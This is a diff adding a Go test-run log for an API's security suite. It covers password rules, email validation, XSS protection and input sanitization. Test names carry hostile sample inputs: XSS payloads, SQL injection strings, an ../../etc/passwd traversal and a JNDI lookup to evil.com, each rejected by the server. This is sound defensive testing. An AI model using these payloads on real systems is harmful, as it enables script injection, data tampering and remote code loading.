@@ -1,0 +1,450 @@
+=== RUN   TestSecurityHeaders
+2025-07-03T21:50:38.758-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "invalid input", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Login
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:108
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestSecurityHeaders.SecurityHeadersMiddleware.func1.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestSecurityHeaders
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:43
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+--- PASS: TestSecurityHeaders (0.00s)
+=== RUN   TestPasswordPolicy
+=== RUN   TestPasswordPolicy/too_short
+2025-07-03T21:50:38.761-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "password must be at least 12 characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:65
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestPasswordPolicy.SecurityHeadersMiddleware.func2.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestPasswordPolicy.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:112
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestPasswordPolicy/no_uppercase
+2025-07-03T21:50:38.761-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "password must contain upper, lower, digit, and special character", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:65
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestPasswordPolicy.SecurityHeadersMiddleware.func2.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestPasswordPolicy.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:112
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestPasswordPolicy/no_lowercase
+2025-07-03T21:50:38.761-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "password must contain upper, lower, digit, and special character", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:65
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestPasswordPolicy.SecurityHeadersMiddleware.func2.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestPasswordPolicy.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:112
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestPasswordPolicy/no_digit
+2025-07-03T21:50:38.761-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "password must be at least 12 characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:65
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestPasswordPolicy.SecurityHeadersMiddleware.func2.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestPasswordPolicy.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:112
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestPasswordPolicy/no_special
+2025-07-03T21:50:38.761-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "password must be at least 12 characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:65
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestPasswordPolicy.SecurityHeadersMiddleware.func2.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestPasswordPolicy.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:112
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestPasswordPolicy/common_password
+2025-07-03T21:50:38.762-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "password must contain upper, lower, digit, and special character", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:65
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).routeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:478
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+connex/tests/security.TestPasswordPolicy.SecurityHeadersMiddleware.func2.1
+	/Users/darrenwei1/Downloads/connex/internal/middleware/security.go:74
+net/http.HandlerFunc.ServeHTTP
+	/usr/local/go/src/net/http/server.go:2294
+github.com/go-chi/chi/v5.(*Mux).ServeHTTP
+	/Users/darrenwei1/go/pkg/mod/github.com/go-chi/chi/v5@v5.2.2/mux.go:90
+connex/tests/security.TestPasswordPolicy.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:112
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestPasswordPolicy/valid_password
+2025-07-03T21:50:38.830-0600	[34mINFO[0m	logger/logger.go:115	user registered	{"user_id": 1, "email": "test-1751601038762034000@example.com", "ip": "192.0.2.1:1234", "action": "register", "timestamp": "2025-07-04T03:50:38.830Z"}
+=== RUN   TestPasswordPolicy/another_valid
+2025-07-03T21:50:38.898-0600	[34mINFO[0m	logger/logger.go:115	user registered	{"user_id": 2, "email": "test-1751601038830248000@example.com", "ip": "192.0.2.1:1234", "action": "register", "timestamp": "2025-07-04T03:50:38.898Z"}
+--- PASS: TestPasswordPolicy (0.14s)
+    --- PASS: TestPasswordPolicy/too_short (0.00s)
+    --- PASS: TestPasswordPolicy/no_uppercase (0.00s)
+    --- PASS: TestPasswordPolicy/no_lowercase (0.00s)
+    --- PASS: TestPasswordPolicy/no_digit (0.00s)
+    --- PASS: TestPasswordPolicy/no_special (0.00s)
+    --- PASS: TestPasswordPolicy/common_password (0.00s)
+    --- PASS: TestPasswordPolicy/valid_password (0.07s)
+    --- PASS: TestPasswordPolicy/another_valid (0.07s)
+=== RUN   TestEmailValidation
+=== RUN   TestEmailValidation/valid_email
+2025-07-03T21:50:38.965-0600	[34mINFO[0m	logger/logger.go:115	user registered	{"user_id": 1, "email": "test@example.com", "ip": "192.0.2.1:1234", "action": "register", "timestamp": "2025-07-04T03:50:38.965Z"}
+=== RUN   TestEmailValidation/valid_with_subdomain
+2025-07-03T21:50:39.040-0600	[34mINFO[0m	logger/logger.go:115	user registered	{"user_id": 2, "email": "test@sub.example.com", "ip": "192.0.2.1:1234", "action": "register", "timestamp": "2025-07-04T03:50:39.040Z"}
+=== RUN   TestEmailValidation/invalid_format
+2025-07-03T21:50:39.040-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "invalid email format", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:57
+connex/tests/security.TestEmailValidation.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:161
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestEmailValidation/missing_@
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "invalid email format", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:57
+connex/tests/security.TestEmailValidation.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:161
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestEmailValidation/missing_domain
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "invalid email format", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:57
+connex/tests/security.TestEmailValidation.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:161
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestEmailValidation/empty_email
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "invalid input", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:53
+connex/tests/security.TestEmailValidation.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:161
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestEmailValidation/too_long
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "email too long", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:57
+connex/tests/security.TestEmailValidation.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:161
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+--- PASS: TestEmailValidation (0.14s)
+    --- PASS: TestEmailValidation/valid_email (0.07s)
+    --- PASS: TestEmailValidation/valid_with_subdomain (0.07s)
+    --- PASS: TestEmailValidation/invalid_format (0.00s)
+    --- PASS: TestEmailValidation/missing_@ (0.00s)
+    --- PASS: TestEmailValidation/missing_domain (0.00s)
+    --- PASS: TestEmailValidation/empty_email (0.00s)
+    --- PASS: TestEmailValidation/too_long (0.00s)
+=== RUN   TestXSSProtection
+=== RUN   TestXSSProtection/xss_<script>alert('xss')</script>
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden content", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestXSSProtection.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:201
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestXSSProtection/xss_<img_src=x_onerror=alert('xss')>
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestXSSProtection.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:201
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestXSSProtection/xss_javascript:alert('xss')
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestXSSProtection.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:201
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestXSSProtection/xss_<svg_onload=alert('xss')>
+2025-07-03T21:50:39.041-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestXSSProtection.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:201
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+--- PASS: TestXSSProtection (0.00s)
+    --- PASS: TestXSSProtection/xss_<script>alert('xss')</script> (0.00s)
+    --- PASS: TestXSSProtection/xss_<img_src=x_onerror=alert('xss')> (0.00s)
+    --- PASS: TestXSSProtection/xss_javascript:alert('xss') (0.00s)
+    --- PASS: TestXSSProtection/xss_<svg_onload=alert('xss')> (0.00s)
+=== RUN   TestRateLimiting
+    security_test.go:213: Rate limiting test requires Redis - run with integration tests
+--- SKIP: TestRateLimiting (0.00s)
+=== RUN   TestCSRFProtection
+    security_test.go:220: CSRF test requires full middleware stack - run with integration tests
+--- SKIP: TestCSRFProtection (0.00s)
+=== RUN   TestErrorHandling
+2025-07-03T21:50:39.042-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "invalid request body", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Login
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:104
+connex/tests/security.TestErrorHandling
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:236
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+--- PASS: TestErrorHandling (0.00s)
+=== RUN   TestJWTValidation
+--- PASS: TestJWTValidation (0.00s)
+=== RUN   TestRequestSizeLimit
+    security_test.go:266: Request size limit test requires full middleware stack - run with integration tests
+--- SKIP: TestRequestSizeLimit (0.00s)
+=== RUN   TestSecurityMonitoring
+    security_test.go:273: Security monitoring test requires full application stack - run with integration tests
+--- SKIP: TestSecurityMonitoring (0.00s)
+=== RUN   TestInputSanitization
+=== RUN   TestInputSanitization/malicious_';_DROP_TABLE_users;_--
+2025-07-03T21:50:39.043-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestInputSanitization.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:306
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestInputSanitization/malicious_<script>alert('xss')</script>
+2025-07-03T21:50:39.043-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden content", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestInputSanitization.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:306
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestInputSanitization/malicious_../../etc/passwd
+2025-07-03T21:50:39.043-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestInputSanitization.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:306
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestInputSanitization/malicious_${jndi:ldap://evil.com/exploit}
+2025-07-03T21:50:39.043-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestInputSanitization.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:306
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+=== RUN   TestInputSanitization/malicious_';_INSERT_INTO_users_VALUES_('hacker',_'hacker@evil.com');_--
+2025-07-03T21:50:39.045-0600	[31mERROR[0m	logger/logger.go:119	API error	{"status": 400, "message": "name contains forbidden characters", "code": "", "request_id": ""}
+connex/pkg/logger.(*Logger).Error
+	/Users/darrenwei1/Downloads/connex/pkg/logger/logger.go:119
+connex/internal/api/middleware.WriteStructuredError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:26
+connex/internal/api/middleware.WriteError
+	/Users/darrenwei1/Downloads/connex/internal/api/middleware/response.go:20
+connex/internal/api/auth.(*Handler).Register
+	/Users/darrenwei1/Downloads/connex/internal/api/auth/handler.go:61
+connex/tests/security.TestInputSanitization.func1
+	/Users/darrenwei1/Downloads/connex/tests/security/security_test.go:306
+testing.tRunner
+	/usr/local/go/src/testing/testing.go:1792
+--- PASS: TestInputSanitization (0.00s)
+    --- PASS: TestInputSanitization/malicious_';_DROP_TABLE_users;_-- (0.00s)
+    --- PASS: TestInputSanitization/malicious_<script>alert('xss')</script> (0.00s)
+    --- PASS: TestInputSanitization/malicious_../../etc/passwd (0.00s)
+    --- PASS: TestInputSanitization/malicious_${jndi:ldap://evil.com/exploit} (0.00s)
+    --- PASS: TestInputSanitization/malicious_';_INSERT_INTO_users_VALUES_('hacker',_'hacker@evil.com');_-- (0.00s)
+PASS
+ok  	connex/tests/security	(cached)
